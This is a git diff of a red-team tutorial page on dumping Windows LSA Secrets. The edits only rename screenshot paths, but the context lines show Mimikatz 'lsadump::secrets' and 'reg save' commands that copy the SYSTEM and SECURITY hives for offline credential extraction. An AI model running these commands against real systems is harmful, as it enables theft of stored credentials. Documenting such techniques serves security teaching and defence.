@@ -12,7 +12,7 @@ LSA Secrets are stored in registry:
 HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets
 ```
 
-![](../../.gitbook/assets/screenshot-from-2019-03-12-20-20-39.png)
+![](<../../.gitbook/assets/Screenshot from 2019-03-12 20-20-39.png>)
 
 ## Execution
 
@@ -27,7 +27,7 @@ lsadump::secrets
 ```
 {% endcode %}
 
-![](../../.gitbook/assets/screenshot-from-2019-03-12-20-25-01.png)
+![](<../../.gitbook/assets/Screenshot from 2019-03-12 20-25-01.png>)
 
 ### Registry
 
@@ -39,7 +39,7 @@ reg save HKLM\SYSTEM system & reg save HKLM\security security
 ```
 {% endcode %}
 
-![](../../.gitbook/assets/screenshot-from-2019-03-12-20-37-11.png)
+![](<../../.gitbook/assets/Screenshot from 2019-03-12 20-37-11.png>)
 
 {% code title="attacker@mimikatz" %}
 ```csharp
@@ -47,7 +47,7 @@ lsadump::secrets /system:c:\temp\system /security:c:\temp\security
 ```
 {% endcode %}
 
-![](../../.gitbook/assets/screenshot-from-2019-03-12-20-38-02.png)
+![](<../../.gitbook/assets/Screenshot from 2019-03-12 20-38-02.png>)
 
 ## References
 
